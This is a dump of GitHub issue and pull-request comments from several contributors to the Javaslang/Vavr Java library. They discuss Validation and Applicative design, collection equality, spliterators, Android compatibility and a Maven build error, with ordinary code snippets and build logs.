proactive on working with me on this. It's been a fun piece of code to work on. :)\n. Ok, I finally have some working code! I had to rework Kind and Applicative a little, in order to expose the error type so that I could return List<E> from ap(). Take a look, as well at changes made according to your other suggestions as well. I think we're getting close! I've updated my tests which are all passing right now.\n. Okay, more changes to review. I'm not 100% sure what you're envisioning when you say to 'flatten the builders'. Can you send me an example of what you're thinking? Thanks Daniel.\n. I'm going to be working on adding much more javadocs, just want to finalize the code and methods first. \n. Good suggestions @danieldietrich. Those changes have been made.\n. @danieldietrich At this point, I'm just looking for any feedback on what will keep you from merging this PR. Are there still any refinements or documentation that you'd like to see before merging? Thanks Daniel.\n. @danieldietrich yay! Thanks so much for your help on this. You made me stick with the Kind2 and Validation work, even though it was more difficult. And it was the right decision. So thanks for all your help. And I'm happy to continue helping on whatever I can to help your push to 2.0.0. I'm very excited for this upcoming release.\n. Yep, I'll rename those and submit. Thanks for the reminder. \n. Nice work!\n. You bet! BTW, do you ever sleep? :) \n. Great!\n. What version of Javaslang are you using? That's a known issue if you're using RC-2.\n. I'm using RC4 in a production project and this works just fine for me (on Mac with Java 1.8.0_72):\n```\nprotected Validation validateToken(String token) {\n        if(token == null || token.length() <= 0)\n            return Validation.invalid(\"Missing token field\");\n    return Validation.valid(token);\n}\n\n``\n. @danieldietrich Hi! Been while since I've contributed to JavaSlang, but wanted to say congrats on release 2.0! I absolutely LOVE the new pattern matching API, fantastic work there.\n. I would also addcomputeIfAbsentas well. Both of these are useful.\n. @danieldietrich Totally understand, and I agree. The restrictions of the Java type system limit the usefulness of this specific transformer. It'd be another thing if we could abstract the wrapper type like Scala allows. Figured it was at least worth a mention. :) I haven't made any contributions to Javaslang in a while so I've been wanting to help out again. You guys are making awesome progress on this awesome library! . Good to know. So out of curiosity, why do you useseq::appendin thesequence()method forFuture? \n. Well,ap(orapply) is not related topureorpoint.Puretake a valueTand lifts it into anApplicativecontext. Whereasapplytakes a value already in such context, and a function also in anApplicative` context, and applies the function to the value, returning its result still in the context. \nSo I believe we need both as they perform different functions. As to whether we merge Apply into Applicative is your call. Both scalaz and cats (https://github.com/non/cats) keep the two separate. It seems cleaner to keep the conventions that both libraries use, and that would be my vote, but you tell me what you'd like to do and I'll do it. Here are links to the 2 traits in both libraries so you can take a look and decide.\nApply:\nhttps://github.com/non/cats/blob/master/core/src/main/scala/cats/Apply.scala\nhttps://github.com/scalaz/scalaz/blob/series/7.3.x/core/src/main/scala/scalaz/Apply.scala\nApplicative:\nhttps://github.com/non/cats/blob/master/core/src/main/scala/cats/Applicative.scala\nhttps://github.com/scalaz/scalaz/blob/series/7.3.x/core/src/main/scala/scalaz/Applicative.scala\n. You know, the more I play with this, the more I think I'm on the wrong path. Apply and Applicative are both generic traits over higher kinded types: Apply[F[_]]. I can't get the types to work right in Java since you can't do this. Do you think that you'll have any other Applicative types in Javaslang? Because if not, then it might make sense to abandon my approach with Apply and Applicative and just keep all of this behavior in Validation. What are your thoughts?\n. Thanks for your feedback Daniel. I'm not saying that Javaslang should be just like other libraries, it was just a suggestion based on other examples. But I'm totally fine with your ideas on this. I see your point that pure and point are just constructors. \nHere's where I'm really stuck though, and why in my previous post I suggested possibly doing away with the Applicative interface altogether. I wasn't just complaining about Java's type system, I know it's strengths and weaknesses. I was simply pointing out that because of its lack of higher kinded types, I'm not sure how to make the Applicative interface work for different kinds of applicative types. I hope I can make sense in what I'm trying to say, please let me know if I'm not.\nLooking at scalaz, they have trait Apply[F[_]]. And then ap is defined as def ap[A,B](fa: => F[A])(f: => F[A => B]): F[B]. Apply's type parameter describes Validation (or any other implementation of Apply), not the type held by Validation. \nWe can't model this in Java. Currently my interface is defined as public interface Applicative<T>, and apply as <U> Applicative<U> apply(Applicative<? extends Function<? super T,? extends U>> f). But this doesn't work. Looking at Validation, it's defined as public interface Validation<E,T> extends Applicative<Validation<E,T>>. That means that the overridden apply method would look like <U> Applicative<U> apply(Applicative<? extends Function<? super Validation<E, T>, ? extends U>> f). But this isn't right. I need it to take a function of Function<T,U>, not Function<Validation<E,T>, U>. This is all messed up because of lack of higher kinded types. \nI may be totally missing the mark here, which is why I'm asking for your input. I'm not seeing how to make the Applicative interface generic enough for any kind of type that wants to implement it. Which is why I was suggesting that if we don't really think we'll add any other type to Javaslang that would implement Applicative, we just get rid of it completely and pull all of our applicative logic into Validation. I really hope I'm making sense here. :) Thanks for your patience. \n. If I change the Validation definition to public interface Validation<E,T> extends Applicative<T>, then my apply looks like this <U> Applicative<U> apply(Applicative<? extends Function<? super T, ? extends U>> f). Which is what I was looking for. But this isn't right because we're saying that the type T is the Applicative, which it is not. Validation is the Applicative.\n. Thank your for all of this great input, and spending some time with me on this. Very interesting approach. I've plugged in this shortened code to play with it, but the result isn't coming out quite right. The signature for the overridden ap() method isn't what you wrote above, but <B> Applicative<Validation<E, ?>, B> ap(Kind<Validation<E, ?>, ? extends Function<? super T, ? extends B>> f). If I force it to <B> Validation<E, B> ap(Validation<E, ? extends Function<? super T, ? extends B>> f), that signature works, but doesn't work as the overridden  Applicative method ap().\nI'm still struggling with whether this is all worth it. This is only worth all this work if we feel we could create other Applicative types. If not, then we should go the simpler route for now and keep all our implemented code in Validation, which I already have a working version of. I'm curious about your thoughts on all of this and if the complexity is worth it? Thanks so much for your help on this Daniel.\n. This is a shortened version of my implementation of your code. The @Override method is the only one that satisfies the Applicative method.\n``` java\npublic interface Validation extends Kind, T>, Applicative, T> {\n@Override\ndefault <B> Applicative<Validation<E, ?>, B> ap(Kind<Validation<E, ?>, ? extends Function<? super T, ? extends B>> f) {\n    return null;\n}\n\ndefault <U> Validation<E, U> ap(Validation<E, ? extends Function<? super T, ? extends U>> v) {\n    return null;\n}\n\ndefault <U> Validation<E, U> map(Function<? super T, ? extends U> f) {\n    return null;\n}\n\n}\n``\n. I'd be curious as to your ideas without the builder. The reason I went with the builder is that it encapsulates all the logic for combining multipleValidations and takes it out ofValidation.java. This seems cleaner. I started messing around with combining validations without a builder, and it got messy. Each time you combine 2 validations, you need to somehow combine their success values. To do this, you either need to supply a combiner function each time, or combine them according to Semigroup rules. But using semigroup doesn't make much sense since it limits how you can combine values. Plus, you won't always have like types in eachSuccess, so Semigroup won't work. The builder allows you to accumulate allSuccesss orFailures and then apply all the success values to a function provided after all accumulation has occurred. Doing this inside ofValidationitself would require some intermediate accumulator in side eachValidation` instance.\n. Still assuming we use the Builder, I have an alternative way of accumulation for consideration. Some might not like the pattern:\njava\nValidation<List<String>,TestValidation> result  = v1.combine(v2).apply(TestValidation::new);\nValidation<List<String>,TestValidation> result2 = v1.combine(v2).combine(v3).apply(TestValidation::new);\nValidation<List<String>,TestValidation> result3 = v1.combine(v2).combine(v4).apply(TestValidation::new);\nValidation<List<String>,String> result4 = v1.combine(v2).combine(v3).apply((p1, p2, p3) -> p1+\":\"+p2+\":\"+p3.orElse(\"none\"));\nSo I've toyed around with this as an alternative way (we could leave both ways in to give choice on accumulation style):\njava\nValidation<List<String>,TestValidation> result = Validation.map2(v1, v2).apply(TestValidation::new);\nValidation<List<String>,TestValidation> result2 = Validation.map3(v1, v2, v3).apply(TestValidation::new);\nValidation<List<String>,String> result3 = Validation.map3(v1, v2, v3).apply((p1, p2, p3) -> p1+\":\"+p2+\":\"+p3.orElse(\"none\"));\n. Agreed Daniel, I think it would be a good addition to the algebra package. I'll keep trying this. I've looked over my code again and it is the same as yours, but I'm still getting the errors on the override method for ap. I'm also using IntelliJ 15.0.2 on a Mac with JDK \u00a01.8.0_66. Not sure what the discrepancy is, but I'll keep at it. You've got some good ideas on how to make this work, so I think it will be good once it's done.\n. Never mind, I was looking at part of this wrong. I think I have it working. Let me play with it a little more.\n. Does it makes sense to put ValidationBuilder into a ValidationModule interface inside of Validation, like is done in Match and other places?\n. @ruslansennov That's a better suggestion. :) Thanks. I'll update that test.\n. ",
    "ChristerF": "Daniel - thanks for explaining the background on the design - I'm not a scala user myself. In Java 8's CompletableFuture, you specify sync/async for each type of Continuation where sync is \"run in current or completion thread\" and async is run by the common pool or a specified executor. \nTo me, a Future in its pure form is primarily a synchronization primitive, not a means to run code asynchronously - but I realize the Scala futures and Java 8's CompletableFuture transforms it to a composer for asynchronous functions.\nRegardless, it would be nice if there would be an easier way to specify \"sync\" than supplying a direct ExecutorService - something along the lines of CompletableFuture.\n. ",
    "asevans48": "Any idea on this? If we could replace Scala with JavaSlang that would be neat. Still, SBT with its continuous build is better.. ",
    "v1ctor": "Thank you. I have fixed it in accordance to your comments.\n. Thanks! I have fixed it in accordance to your notes. \n. @danieldietrich It's ok! How you said earlier \"It's normal dev process...\" :)\n. I've passed all the tests on my own machine and it has finished successfully.\nHow can I reprocess the tests at Travis CI?\n. Thanks for you comments, I've fixed all the mistakes :)\n. Thanks!\n. I do something like that:\njava\nvoid setValue(Object value) {\n    if (!this.option.isSome(value)) {\n         //Update value in DB\n    }\n    //Do nothing\n}\n. Alright! It looks the same :)\n. Hi! After some investigation I have found these problems:\n- First of all, it's impossible to create default implementation of equals in Traversable, because it's interface. So I've created a static method which is using isSequential() and isDistinct() introspection methods.\n- We would like to optimize equals and hashCode for Iterator.range(), we could only check borders instead of every element, but then Iterator.of(1, 2, 3) and Iterator.range(1, 4) won't be equal.\n@danieldietrich What do you think? Especially about the second problem. . @danieldietrich \nYes, I've done it exactly like you've told \ud83d\udc4d \nThank you for the refinements. I will carry on.. Hi! If I understand CONCURRENT description right neither of our cases apply for this characteristics, because we have immutable types. Am I right?. @danieldietrich Could I also ask you what do you mean by separating characteristics for key/values and values for maps? \nHow I understand as our Map implement Traversable> we will have Splititerator> and characteristics for this spliterator we could from introspection methods.\nAlso how I understand if we want to take spliterator for the values, we will do it like that: \njava\nmap.values().spliterator();\nBut in this case, unfortunately, we can't have SIZED and SUBSIZED characteristics, because we return Seq from values() and this class doesn't have fixed size.\nI've already written some code, and I can create PR to see if I'm going to the right direction. . Hi @danieldietrich , thanks for the feedback! First I added null checks to the code, but then I realized that as soon as these methods are wrappers around existing functions these checks will be executed inside. So I removed them. Do you want me to add them explicitly?. @danieldietrich Yes, you're totally right. I've missed this case. Thanks!. Thank you :). Hi @danieldietrich, I've fixed everything you've said :)\n. @danieldietrich Haven't seen you comment :) \nBut if we need to have ORDERED and SIZED characteristics for the Value classes I will add them back.. @danieldietrich Yes, we're. But I don't really understand if these characteristics make any difference for the single-valued types? How I understand as we at most have only one element, trySplit() method won't have any effect. . I also hope that it was the final commit.\nThank you for the support!\nP.S. I will take something else ;-)  If you have something in your mind, it would be great!. @danieldietrich @ruslansennov How I understand HashSet.of(1, 2, 3) should be equal to TreeSet.of(1, 2, 3), but what about LinkedHashSet? Do we need to check order or not?\nIf we check order it means that HashSet.of(1, 2, 3) won't be equal to LinkedHashSet.of(1, 2, 3) because first one isn't sequential.\nWhat do you think?. @danieldietrich @ruslansennov I've found that compareTo for Tuple2 throw npe if right or left is null. For now, I just switched off shouldZipAllNonEmptyAndNil() test for TreeSet, but I believe we need to think how to compare Tuples with nulls correctly.\nI've rewritten code, and fixed all the tests, but do not merge it yet, because I would like to write new tests to check different collections equality.\n . @danieldietrich You're doing a really great job! Thank you for the help. I am reading through your comments and I will come with new implementation soon. :). Hi @danieldietrich, I've rewritten equals methods and add the check that if collections are equal then they should have the same hashCode. \nThere are really a lot of information in this PR, and I feel a little bit lost.\nThe problem with hashCode that if we will compare SortedSet and non sorted Set if they have the same elements equals will return us true, but hashCode will be different for ordered and unordered Sets. I think that we should leave it like we have right know, because it conforms equals/hashCode contract \u2013 hashCode could be the same, but collections could not be equal.\n. @danieldietrich \nThank you very much for supporting and mentoring me!\nIf you have something else in your mind feel free to assign me.. It's the same like in method above.\n. :-D\nYes, I'll do that.\n. Yes, you're right. I have fixed it.\n. I'm sorry. I've installed settings and reformat this.\n. Don't you want to setup checkstyle and findbugs target in travis to have static code analysis? \n. Yes. It's stupid mistake :(\n. Yes I've some experience in it. If we will have such false positives we could setup the environment to ignore this errors.\n. That's a really awesome investigation! Thank you :). Yes, there is. In Traversable we are using a spliterator based on a given iterator which is IteratorSpliterator. It has such implementation of getComparator():\nif (hasCharacteristics(Spliterator.SORTED))\n                return null;\n            throw new IllegalStateException();\nFor some reason I thought that it is ok to return null. But know I understood that only Linked Maps are sorted that why I have to implement the same logic. And I will :). Yes, you're right I will fix an implementation of hashCode for the maps.. As it is static method we could pass for example equals(null, TreeSet.of(1, 2, 3)) that's why we need to check explicitly if none of parameters are null.. Yes, until it is used only in equals, but we shouldn't forget how to use this static method. Maybe annotate source with @NotNull?. ",
    "mariuszs": ":+1: \n. Wow, great news :)\n. ",
    "norbson": "It is great that You will include this use case in the upcoming release but Your proposition only partially solve presented (admittedly, poorly described) problem. What I am really talking about is such example scenario:\nMatch.of(msg)\n    .whenType(Date.class).then(date -> println(date.getTime()))\n    .whenType(String.class).then(str -> println(str.length()))\n    .whenType(Number.class).then(num -> println(num.intValue()))\n    .otherwise(obj -> println(\"Unknown \" + obj));\nSimilarly \nwhen().then()\nshould be possible.\nFor more info take a look\nhttps://github.com/nurkiewicz/typeof\n. Awesome :)\n. I have reserved nearest weekend for that. I will do my best :)\n. Hello, I have 2 open questions.\n1. I have prepared pull request with implementation for MatchFunction. Unfortunately overloaded methods with Function and Consumer introduce ambiguity. Any idea? :)\n2. Regarding MatchMonad, internals assumes that any action for matching condition should return something other than null.\nprivate static <T, R> Option<Supplier<? extends R>> computeResult(...) {\n...\nreturn Option.of(() -> f.apply(value)); \n}\nConsumer or Runnable returns null, so MatchMonad will consume each matching case and otherwise case too :/\n. Yes you have right. It was my mistake. I will correct it and create another pull request :)\n. No, i do not have to change any line of existing code and of course all will cover all changes with tests.\n. It looks that there is a problem with potential ambiguity between overloaded method taking consumer and function :/\nhttp://stackoverflow.com/questions/30584887/java-8-consumer-function-lambda-ambiguity\nI assume there is nothing we can do except renaming it?\n. Yes, I have exactly the same thought about it. But I was not sure if you would take to consider some additional method name. Your naming proposition is perfect. I will introduce changes tomorrow and of course remove this nasty explicit castings :).\nBtw. in issue I described my consideration/problem related to introducing similar changes to MatchMonad. Could you look at it?\nBR,\nNorbert \n. ",
    "tkob": "OK. Thank you for the reply.\n. Thank you.\n. ",
    "gtrefs": "@danieldietrich awesome. Thank you.\n. Ah... nice :). I did not find anything else. I will create a PR later this evening. . :+1: nice to know. Sure :). It was a bit late yesterday and I had some craft beers :smile:. Sorry for not cleaning before pushing. I hope this is fine now.. Don't push it yet. I accidently removed some empty lines in Arbitrary. @ruslansennov \nYou are right. It looks like unifying the implementation in Collections is the culprit.\nBefore:\nJava\ndefault Stream<T> dropWhile(Predicate<? super T> predicate) {   \n       Objects.requireNonNull(predicate, \"predicate is null\");\n        Stream<T> stream = this;    \n        while (!stream.isEmpty() && predicate.test(stream.head())) {        \n            stream = stream.tail();     \n        }       \n        return stream;      \n    }\nAfter (call to Collections):\nJava\n   @SuppressWarnings(\"unchecked\")\n    static <T, S extends Seq<T>> S dropUntil(S seq, Predicate<? super T> predicate) {\n        Objects.requireNonNull(predicate, \"predicate is null\");\n        for (int i = 0; i < seq.length(); i++) {\n            if (predicate.test(seq.get(i))) {\n                return (S) seq.drop(i);\n            }\n        }\n        return (S) seq.take(0);\n    }\nThough, I am not sure how one can improve the complexity?. Thanks for the comments. I will add the changes later :). Could you rather add a little explanation why one should not use this method when using infinite collections? I think this is more convinient than referring to a github issue which might get lost over the time.. See comment above.. ",
    "bartolom": "Just as a comment: From a developer point of view, it would be nice if your library would use similar patterns to the upcoming Java 9 stuff in JEP 269. I think your factory method Map.of here does this already. Just mentioning, in case, you have not stumbled upon it yet.\nhttp://openjdk.java.net/jeps/269\nhttps://www.youtube.com/watch?v=OJrIMv4dAek \"Young Pups: New Collections APIs for Java 9 by Stuart Marks\"\n. Dear Javaslang Team,\nI just stumbe upon this ticket, as I'm looking forward to the 2.0 releases. So maybe you have had already discussions about this, so I just wanted to comment my impression about the semantics:\nI find methods like toJavaXxx() a bit odd, as JavaSlang is also a Java library as far as I understand it.\nAren't you mapping between your collections implementation and the OpenJDK \"Java Collections Framework\"\nhttps://docs.oracle.com/javase/8/docs/technotes/guides/collections/overview.html\nAs \"JCF\" is not really a established acronym what do you think about \"JDK\", which is a well established term in the Java/JVM community?\nSo you would have Map.toJdkMap(), though even I have to admit that Map.toJavaMap() looks a bit cleaner. Maybe just mentioning it in the javadocs is fine.\n. Naming can be tricky.\nThe naming of .toJavaXxx() is fine the way you explain it. I think javadocs with modern IDE support are a good solution.\nJust as a note about .toJdkXxx() vs. toJreXxx():\nCollection frameworks like JCF and your Javaslang are usually aimed at developers, as mainly they can \"create\" something meaningful with it. I as a developer use the \"Development Kit\" and tend to think in JDK like: \"Why not use X (E.g. CompletableFuture) its now part of the JDK\". I know that a Tomcat server might run in a JRE in production but that's the operation side.\nFor me saying \"something is in the JDK\" means I don't need to fiddle around in Maven/Gradle to get it. \n. ",
    "romildo": "A preliminary version can be found at: java-box.\n. Example of output:\n\u250c\u2500\u2500\u2500\u2510                     \n                     \u2502Ann\u2502                     \n                     \u2514\u2500\u2500\u2500\u2518                     \n             \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \n          \u250c\u2500\u2500\u2500\u2500\u2510                  \u250c\u2500\u2500\u2500\u2500\u2500\u2510      \n          \u2502Mary\u2502                  \u2502Peter\u2502      \n          \u2514\u2500\u2500\u2500\u2500\u2518                  \u2514\u2500\u2500\u2500\u2500\u2500\u2518      \n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2510    \n\u250c\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502John\u2502  \u2502Karen\u2502 \u2502 Steven \u2502  \u2502 Paul  \u2502 \u2502Anthony\u2502\n\u2514\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 Abbot  \u2502  \u2502Palucci\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n  \u2502             \u2502Braddock\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518          \n\u250c\u2500\u2500\u2500\u2500\u2500\u2510         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                     \n\u2502Avila\u2502                                        \n\u2514\u2500\u2500\u2500\u2500\u2500\u2518\nObviously the connections can be more perfect.\n. I like the idea.\n. @danieldietrich Ok. Thank you for the invitation and  for setting up the repository.\n. >Tree is dropped in Vavr 1.0\nThere will be a replacement for it?\nI am using Vavr on my compiler classes because of Tree.. ",
    "mbarbieri": "Hi,\nI'm trying to do that.\nAny suggestion on how to test it?\nI tried to replace all instaces of Match.of(option) to option.match() and it works, but I was looking to something more complete... does it makes sense to compare matchers for equality in some way?\n. Happy New Year! :cocktail:\n. ",
    "bruce264": "@danieldietrich Let's hope so :)\n@ruslansennov I'm curious about your comment \n\"Android Dalvik format accept only 65k methods in one *.dex file.\"\nI'm currently developing an app with multidexing and I haven't had any issues so far including many libraries in it like FunctionalJava or TotallyLazy, what's the issue you foresee here for javaslang, does it have more than 65k methods on its own?\n. ",
    "mhdtouban": "I would love to use javaslang in android sometime near in the future, especially that android is adobting java 8. https://android-developers.googleblog.com/2017/03/future-of-java-8-language-feature.html. ",
    "mariopce": "I used javaslang ver 2.0.0 on android with jack compiler. \nIt works ! \nI have some warnings: \n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:98-99: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:123-124: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:123-124: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:135-136: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:135-136: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:162-163: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:148-149: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:162-163: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:177-178: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:148-149: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:177-178: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:192-193: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:192-193: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:197-198: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:197-198: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:229-230: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:229-230: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:208-209: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:208-209: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\n/Users/saramakm/projects/tt/maps-android-sample-apps/LocalRepoApp/Function6.java:187-188: Serializable lambda is not supported on Android\nBut it works ! \nI used this example: \nFunction2<String, String, String> fun = (s1, s2) -> {\n            return s1 + \" \" + s2;\n        };\n        String s =  fun.apply(\"One\", \"Two\");\nAnd it works fine. . I.e In app I'm using a lot of libraries ( guava, gson ) and javaslang. I need too use multidex. \nMy sample app which use almost more then 100MB of jars compile 4min and at the end apk has 20mb - without proguard. . Version 2.0.5 - works too. :)\napk analyzer don't return method count :( . ",
    "ersin-ertan": "9382 Methods for compile \"io.javaslang:javaslang:2.0.5\"\n.apk size of 434 KB\nInitial apk build fail due to an issue with the annotation processor in - javaslang-match-2.0.5.jar:\n\n\nError:Execution failed for task ':app:javaPreCompileDebug'.\n\nAnnotation processors must be explicitly declared now.  The following dependencies on the compile classpath are found to contain annotation processor.  Please add them to the annotationProcessor configuration.\n    - javaslang-match-2.0.5.jar\n  Alternatively, set android.defaultConfig.javaCompileOptions.annotationProcessorOptions.includeCompileClasspath = true to continue with previous behavior.  Note that this option is deprecated and will be removed in the future.\n  See https://developer.android.com/r/tools/annotation-processor-error-message.html for more details.\n\n\n\n\n\nThis workaround is confirmed for now:\nandroid.defaultConfig.javaCompileOptions.annotationProcessorOptions.includeCompileClasspath = true\n```\nBe sure to set:\nminSdkVersion 24 // or higher\ncompileOptions {\n    sourceCompatibility JavaVersion.VERSION_1_8\n    targetCompatibility JavaVersion.VERSION_1_8\n  }\n```. ",
    "tmtron": "Now that the final version of Android Studio 3 with direct Java8 support is around the corner, I think it's a good time to revisit this issue: see New Java8 language features Android Studio 3\nMethod Count\nI don't think that the vavr develpers should try to reduce the number of methods: The developers who add a library to their Android-application are responsible to decide about the pros and cons of using an external library.\nMoreover, the number of methods in a library does not matter so much, because Code Shrinking will strip away all unused code.  So the real number of added methods depends on what parts of a library you actually use. \nAndroid has tools APK Analyzer so that everybody can check how a new library affects their application and may decide to use Multidex to work around the 64k limit or ditch the library.\nIt should just be noted, that the ART runtime (which replaces Dalvik since API level 21) has native multidex support: i.e. better performance and we don't need the multidex support library anymore.\nsee About the 64K reference limit\nAndroid Support\nJust some thoughts of mine for the discussion.\nAnnotation Processors\nThe actual annotations and annotation processors should be in separate jar files.\nThen you can add vavr-match.jar (which includes only the annotations) to the classpath and the vavr-match-processor to the processor-classpath.\nThis improves performance and keeps the classpath clean: see also Use the annotation processor dependency configuration\n\nIn previous versions of the Android plugin for Gradle, dependencies on the compile classpath were automatically added to the processor classpath. That is, you could add an annotation processor to the compile classpath and it would work as expected. However, this causes a significant impact to performance by adding a large number of unnecessary dependencies to the processor.\n\nAnother disadvantage of the current single-jar is that we must disable an error check\nand setup proguard-rules to exclude the processor dependencies, like so:\n# unfortunately vavr does not have 2 separate jars for the annotations and for the processor\n-dontwarn io.vavr.match.*\n-dontwarn io.vavr.match.generator.*\n-dontwarn io.vavr.match.model.**\n\nJava Language Support\nUse Java 8 language features does not solve all problems with java-code on Android. As the name says, it only allows the use of java language features (e.g. lambdas, Default interface methods, ..). Those features will be processed by the Android tool-chain and thus you can use these features regardless of the Android version: i.e. you can also use your applicatoin which originated from Java-8 source code on old Android 4.0 devices.\nJava Library Support\nBut this Java8 support does not magically backfill missing java library classes. So it is in a way similar to GWT development: only a subset of the Java SDK is supported. The level of support depends on the device that you install your app on.  \nExample:\nThe implementation of toSortedSet calls Comparator.naturalOrder which has been added in API level 24.\nThis means, that the application will run fine on API Level 24 or higher, but will cause a runtime-exception on older devices.  \nThe Android build will show this problem:\nWarning: io.vavr.Value$$CC: can't find referenced method 'java.util.Comparator naturalOrder$$STATIC$$()' in library class java.util.Comparator\n\nTo work around this problem, users of the vavar library can simply call the overloaded function toSortedSet(Comparator) which takes a comparator as parameter.\nOther problems may be more tricky to solve.\ne.g. the Function interface has been added in API Level 24. Maybe something like Android-Retrostreams could help?\nI guess this is the tricky part of Android Support. And you may have to decide which API levels to support:\ne.g. According to the Version dashboard from today (10.10.2017) \n API level 24 or higher: 18%\n API level 21 or higher: 71%\n\n. > 5.   Make it releasable. Currently we use OSS Sonatype. I don't know if there is a better alternative?\nYou should take a look at Bintray: I think it's easier than OSS Sonatype. The artifacts are published on JCenter and synced to MavenCentral\nHere's a gradle-plugin to work with Bintray: gradle-bintray-plugin. I can workaround the error by using an older scala version. Then the compilation works:\nxml\n        <!-- scala.version>2.12.2</scala.version -->\n        <scala.version>2.10.6</scala.version>\nBut a test fails - not sure if this is now a result of the different scala version or a real issue.\n```\nshouldAwaitAndTimeout(io.vavr.concurrent.FutureTest)  Time elapsed: 0.123 sec  <<< FAILURE!\njava.lang.AssertionError:\nExpecting:\n <119L>\nto be between:\n [100L, 110L]\n        at io.vavr.concurrent.FutureTest.shouldAwaitAndTimeout(FutureTest.java:504)\nRunning io.vavr.collection.euler.Euler34Test\n```\nSystem Info:\n```\nApache Maven 3.3.9 (bb52d8502b132ec0a5a3f4c09453c07478323dc5; 2015-11-10T17:41:47+01:00)\nMaven home: C:\\Program Files (x86)\\JetBrains\\IntelliJ IDEA Community Edition 2017.1\\plugins\\maven\\lib\\maven3\\bin..\nJava version: 1.8.0_121, vendor: Oracle Corporation\nJava home: C:\\Program Files\\Java\\jdk1.8.0_121\\jre\nDefault locale: en_GB, platform encoding: Cp1252\nOS name: \"windows 10\", version: \"10.0\", arch: \"amd64\", family: \"dos\"\n```. Still fails on my machine: full error-listing:\nFailed to execute goal net.alchim31.maven:scala-maven-plugin:3.3.1:script (default) on project vavr: wrap: java.lang.Exception: A NoSuchMethodError exception was thrown: scala.Predef$.refArrayOps([Ljava/lang/Object;)[Ljava/lang/Object; -> [Help 1]\nSystem-info:\nD:\\Tmp\\javaslang>mvn -version\nApache Maven 3.3.9 (bb52d8502b132ec0a5a3f4c09453c07478323dc5; 2015-11-10T17:41:47+01:00)\nMaven home: C:\\Program Files (x86)\\JetBrains\\IntelliJ IDEA Community Edition 2017.1\\plugins\\maven\\lib\\maven3\\bin\\..\nJava version: 1.8.0_121, vendor: Oracle Corporation\nJava home: C:\\Program Files\\Java\\jdk1.8.0_121\\jre\nDefault locale: en_GB, platform encoding: Cp1252\nOS name: \"windows 10\", version: 